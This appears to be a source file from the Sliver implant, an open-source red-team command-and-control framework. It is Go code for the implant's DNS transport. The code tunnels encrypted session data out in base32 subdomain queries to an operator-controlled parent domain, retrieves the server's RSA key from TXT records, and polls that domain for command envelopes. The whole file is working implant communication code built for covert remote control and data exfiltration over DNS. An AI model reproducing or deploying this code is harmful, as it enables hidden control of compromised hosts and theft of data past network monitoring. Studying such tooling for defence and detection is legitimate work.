package main

import (
	"bytes"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"math"

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}

	insecureRand "math/rand"
	"net"
	pb "sliver/protobuf"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
)

const (
	sessionIDSize = 16

	dnsSendDomainSeg  = 63
	dnsSendDomainStep = 189 // 63 * 3

	domainKeyMsg  = "_domainkey"
	blockReqMsg   = "b"
	clearBlockMsg = "cb"

	sessionInitMsg    = "si"
	sessionPollingMsg = "sp"

	nonceStdSize = 6

	blockIDSize = 6

	maxFetchTxts = 200 // How many txts to request at a time
)

var (
	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")

	pollInterval = 1 * time.Second

	replayMutex = &sync.RWMutex{}
	replay      = &map[string]bool{}
)

// RecvBlock - Single block from server
type RecvBlock struct {
	Index int
	Data  []byte
}

// BlockReassembler - Data is encoded and split into `Blocks`
type BlockReassembler struct {
	ID   string
	Size int
	Recv chan RecvBlock
}

// Basic message replay protect, hash the cipher text and store it in a map
// we should never see duplicate ciphertexts. We have to maintain the map
// for the duration of execution which isn't great. In the future we may want
// to add time-stamps and clear old hashes to keep memory usage lower.
// A re-key message could also help since we could clear all old msg digests
func isReplayAttack(ciphertext []byte) bool {
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	replayMutex.Lock()
	defer replayMutex.Unlock()
	if _, ok := (*replay)[digest]; ok {
		// {{if .Debug}}
		log.Printf("WARNING: Replay attack detected")
		// {{end}}
		return true
	}
	(*replay)[digest] = true
	return false
}

// --------------------------- DNS SESSION SEND ---------------------------

func dnsLookup(domain string) (string, error) {
	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	txts, err := net.LookupTXT(domain)
	if err != nil || len(txts) == 0 {
		// {{if .Debug}}
		log.Printf("[!] failure -> %s", domain)
		// {{end}}
		return "", err
	}
	return strings.Join(txts, ""), nil
}

// Send raw bytes of an arbitrary length to the server
func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {

	encoded := dnsEncodeToString(data)
	log.Printf("Full msg: %#v", encoded)
	size := int(math.Ceil(float64(len(encoded)) / float64(dnsSendDomainStep)))
	// {{if .Debug}}
	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
	// {{end}}

	nonce := dnsNonce(32) // Larger nonce for this use case

	// DNS domains are limited to 254 characters including '.' so that means
	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes
	// So we have 63 * 3 = 189 (+ 3x '.') + metadata
	// So we can send up to (3 * 39) 117 bytes encoded as 3x 63 character subdomains
	// We have a 4 byte uint32 seqence number, max msg size (2**32) * 117 = 502511173632
	//
	// Format: (subdata...).(seq).(nonce).(_)(msgType).<parent domain>
	//                [63].[63].[63].[4].[32].[3].
	//                    ... ~234 chars ...
	//                Max parent domain: ~20 chars
	//
	for index := 0; index < size; index++ {
		// {{if .Debug}}
		log.Printf("Sending domain #%d of %d", index+1, size)
		// {{end}}
		start := index * dnsSendDomainStep
		stop := start + dnsSendDomainStep
		if len(encoded) <= stop {
			stop = len(encoded)
		}
		// {{if .Debug}}
		log.Printf("Send data[%d:%d] %d bytes", start, stop, len(encoded[start:stop]))
		// {{end}}
		data := encoded[start:stop] // Total data we're about to send

		subdomains := int(math.Ceil(float64(len(data)) / dnsSendDomainSeg))
		// {{if .Debug}}
		log.Printf("Subdata subdomains: %d", subdomains)
		// {{end}}

		subdata := []string{} // Break up into at most 3 subdomains (189)
		for dataIndex := 0; dataIndex < subdomains; dataIndex++ {
			dataStart := dataIndex * dnsSendDomainSeg
			dataStop := dataStart + dnsSendDomainSeg
			if len(data) < dataStop {
				dataStop = len(data)
			}
			// {{if .Debug}}
			log.Printf("Subdata #%d [%d:%d]: %#v", dataIndex, dataStart, dataStop, data[dataStart:dataStop])
			// {{end}}
			subdata = append(subdata, data[dataStart:dataStop])
		}
		// {{if .Debug}}
		log.Printf("Encoded subdata: %#v", subdata)
		// {{end}}

		subdomain := strings.Join(subdata, ".")
		seq := dnsEncodeToString(dnsDomainSeq(index))
		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s", seq, nonce, msgType, parentDomain)
		_, err := dnsLookup(domain)
		if err != nil {
			return "", err
		}

	}
	// A domain with no data means it's the end of the message
	domain := fmt.Sprintf("%s.%s.%s", nonce, "_"+msgType, parentDomain)
	txt, err := dnsLookup(domain)
	if err != nil {
		return "", err
	}
	return txt, nil
}

// Binary encoding of the current position of the data encoded into a domain
func dnsDomainSeq(seq int) []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, uint32(seq))
	return buf.Bytes()
}

// --------------------------- DNS SESSION START ---------------------------

func dnsStartSession(parentDomain string) (string, AESKey, error) {
	sessionKey := RandomAESKey()

	pubKey := dnsGetServerPublicKey()
	dnsSessionInit := &pb.DNSSessionInit{
		Key: sessionKey[:],
	}
	data, _ := proto.Marshal(dnsSessionInit)
	encryptedData, err := RSAEncrypt(data, pubKey)
	if err != nil {
		return "", AESKey{}, err
	}

	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, encryptedData)
	if err != nil {
		return "", AESKey{}, errors.New("Failed to start new DNS session")
	}
	// {{if .Debug}}
	log.Printf("Encrypted session id = %s", encryptedSessionID)
	// {{end}}
	encryptedSessionIDData, err := base64.RawStdEncoding.DecodeString(encryptedSessionID)
	if err != nil || isReplayAttack(encryptedSessionIDData) {
		// {{if .Debug}}
		log.Printf("Session ID decode error %v", err)
		// {{end}}
		return "", AESKey{}, errors.New("Failed to decode session id")
	}
	sessionID, err := GCMDecrypt(sessionKey, encryptedSessionIDData)
	if err != nil {
		return "", AESKey{}, errors.New("Failed to decrypt session id")
	}

	return string(sessionID), sessionKey, nil
}

// Get the public key of the server
func dnsGetServerPublicKey() *rsa.PublicKey {
	pubKeyPEM, err := LookupDomainKey(sliverName, dnsParent)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch domain key %v", err)
		// {{end}}
		return nil
	}

	pubKeyBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if pubKeyBlock == nil {
		// {{if .Debug}}
		log.Printf("failed to parse certificate PEM")
		// {{end}}
		return nil
	}
	// {{if .Debug}}
	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(pubKeyBlock))
	// {{end}}

	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
	if certErr == nil {
		cert, _ := x509.ParseCertificate(pubKeyBlock.Bytes)
		return cert.PublicKey.(*rsa.PublicKey)
	}

	// {{if .Debug}}
	log.Printf("Invalid certificate %v", err)
	// {{end}}
	return nil
}

// LookupDomainKey - Attempt to get the server's RSA public key
func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
	selector = strings.ToLower(selector)
	nonce := dnsNonce(nonceStdSize)
	domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeyMsg, parentDomain)
	// {{if .Debug}}
	log.Printf("[dns] lookup -> %s", domain)
	// {{end}}
	txts, err := net.LookupTXT(domain)
	if err != nil {
		return nil, err
	}
	// {{if .Debug}}
	log.Printf("txts = %v err = %v", txts, err)
	// {{end}}
	if len(txts) == 0 {
		return nil, errors.New("Invalid _domainkey response")
	}

	fields := strings.Split(txts[0], ".")
	if len(fields) < 2 {
		return nil, errors.New("Invalid _domainkey response")
	}
	// {{if .Debug}}
	log.Printf("Fetching Block ID = %s (Size = %s)", fields[0], fields[1])
	// {{end}}
	return getBlock(parentDomain, fields[0], fields[1])
}

// --------------------------- DNS SESSION RECV ---------------------------

func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
	for {
		select {
		case <-ctrl:
			return
		case <-time.After(pollInterval):
			nonce := dnsNonce(nonceStdSize)
			domain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
			// {{if .Debug}}
			log.Printf("[dns] lookup -> %s", domain)
			// {{end}}
			txts, err := net.LookupTXT(domain)
			if err != nil || len(txts) < 1 {
				// {{if .Debug}}
				log.Printf("Error while polling session %v", err)
				// {{end}}
				break
			}
			rawTxt, _ := base64.RawStdEncoding.DecodeString(txts[0])
			pollData, err := GCMDecrypt(sessionKey, rawTxt)
			dnsPoll := &pb.DNSPoll{}
			err = proto.Unmarshal(pollData, dnsPoll)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Invalid _sp response")
				// {{end}}
				break
			}

			for _, blockPtr := range dnsPoll.Blocks {
				go func(blockPtr *pb.DNSBlockHeader) {
					envelope := getSessionEnvelope(parentDomain, sessionKey, blockPtr)
					if envelope != nil {
						recv <- envelope
					}
				}(blockPtr)
			}
		}
	}
}

// Poll returned the server has a message for us, fetch the entire envelope
func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
	blockData, err := getBlock(parentDomain, blockPtr.Id, fmt.Sprintf("%d", blockPtr.Size))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch block with id = %s", blockPtr.Id)
		// {{end}}
		return nil
	}
	envelopeData, err := GCMDecrypt(sessionKey, blockData)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to decrypt block with id = %s", blockPtr.Id)
		// {{end}}
		return nil
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(envelopeData, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("error decoding message %v", err)
		// {{end}}
		return nil
	}
	return envelope
}

// Perform concurrent DNS requests to fetch all blocks of data
func getBlock(parentDomain string, blockID string, size string) ([]byte, error) {
	n, err := strconv.Atoi(size)
	if err != nil {
		return nil, err
	}
	reasm := &BlockReassembler{
		ID:   blockID,
		Size: n,
		Recv: make(chan RecvBlock, n),
	}

	var wg sync.WaitGroup
	data := make([][]byte, reasm.Size)

	fetchTxts := maxFetchTxts
	if reasm.Size < maxFetchTxts {
		fetchTxts = reasm.Size
	}

	for index := 0; index < reasm.Size; index += fetchTxts {
		wg.Add(1)
		go fetchRecvBlock(parentDomain, reasm, index, index+fetchTxts, &wg)
	}
	done := make(chan bool)
	go func() {
		for block := range reasm.Recv {
			data[block.Index] = block.Data
		}
		done <- true
	}()
	wg.Wait()
	close(reasm.Recv)
	<-done // Avoid race where range of reasm.Recv isn't complete

	msg := []byte{}
	for _, buf := range data {
		msg = append(msg, buf...)
	}
	nonce := dnsNonce(nonceStdSize)
	go func() {
		domain := fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain)
		// {{if .Debug}}
		log.Printf("[dns] lookup -> %s", domain)
		// {{end}}
		net.LookupTXT(domain)
	}()
	return msg, nil
}

// Fetch a single block
func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
	defer wg.Done()
	nonce := dnsNonce(nonceStdSize)
	domain := fmt.Sprintf("_%s.%d.%d.%s.%s.%s", nonce, start, stop, reasm.ID, blockReqMsg, parentDomain)
	// {{if .Debug}}
	log.Printf("[dns] fetch -> %s", domain)
	// {{end}}
	txts, err := net.LookupTXT(domain)
	// {{if .Debug}}
	log.Printf("[dns] fetched %d txt record(s)", len(txts))
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to fetch blocks %v", err)
		// {{end}}
		return
	}
	for _, txt := range txts {
		// Split on delim '.' because Windows strcat's multiple TXT records
		for _, record := range strings.Split(txt, ".") {
			if len(record) == 0 {
				continue
			}
			// {{if .Debug}}
			log.Printf("Decoding TXT record: %s", record)
			// {{end}}
			rawBlock, err := base64.RawStdEncoding.DecodeString(record)
			if err != nil {
				// {{if .Debug}}
				log.Printf("Failed to decode raw block '%s'", rawBlock)
				// {{end}}
				continue
			}
			if len(rawBlock) < 4 {
				// {{if .Debug}}
				log.Printf("Invalid raw block size %d", len(rawBlock))
				// {{end}}
				continue
			}
			seqBuf := make([]byte, 4)
			copy(seqBuf, rawBlock[:4])
			seq := int(binary.LittleEndian.Uint32(seqBuf))
			// {{if .Debug}}
			log.Printf("seq = %d (%d bytes)", seq, len(rawBlock[4:]))
			// {{end}}
			reasm.Recv <- RecvBlock{
				Index: seq,
				Data:  rawBlock[4:],
			}
		}
	}
}

// --------------------------- HELPERS ---------------------------

func dnsBlockHeaderID() string {
	insecureRand.Seed(time.Now().UnixNano())
	blockID := []rune{}
	for i := 0; i < blockIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		blockID = append(blockID, dnsCharSet[index])
	}
	return string(blockID)
}

// dnsNonce - Generate a nonce of a given size
func dnsNonce(size int) string {
	insecureRand.Seed(time.Now().UnixNano())
	nonce := []rune{}
	for i := 0; i < size; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		nonce = append(nonce, dnsCharSet[index])
	}
	return string(nonce)
}

// Wrapper around GCMEncrypt & Base32 encode
func sessionEncrypt(sessionKey AESKey, data []byte) string {
	encryptedData, _ := GCMEncrypt(sessionKey, data)
	return dnsEncodeToString(encryptedData)
}

func fingerprintSHA256(block *pem.Block) string {
	hash := sha256.Sum256(block.Bytes)
	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
	return strings.TrimRight(b64hash, "=")
}

// --------------------------- ENCODER ---------------------------

var base32Alphabet = "0123456789abcdefghjkmnpqrtuvwxyz"
var sliverBase32 = base32.NewEncoding(base32Alphabet)

// EncodeToString encodes the given byte slice in base32
func dnsEncodeToString(input []byte) string {
	encoded := sliverBase32.EncodeToString(input)
	// {{if .Debug}}
	log.Printf("[base32] %#v", encoded)
	// {{end}}
	return strings.TrimRight(encoded, "=")
}

// DecodeString decodes the given base32 encodeed bytes
func dnsDecodeString(raw string) ([]byte, error) {
	pad := 8 - (len(raw) % 8)
	nb := []byte(raw)
	if pad != 8 {
		nb = make([]byte, len(raw)+pad)
		copy(nb, raw)
		for index := 0; index < pad; index++ {
			nb[len(raw)+index] = '='
		}
	}
	return sliverBase32.DecodeString(string(nb))
}

// SessionIDs are public parameters in this use case
// so it's only important that they're unique
func dnsSessionID() string {
	insecureRand.Seed(time.Now().UnixNano())
	sessionID := []rune{}
	for i := 0; i < sessionIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		sessionID = append(sessionID, dnsCharSet[index])
	}
	return "_" + string(sessionID)
}
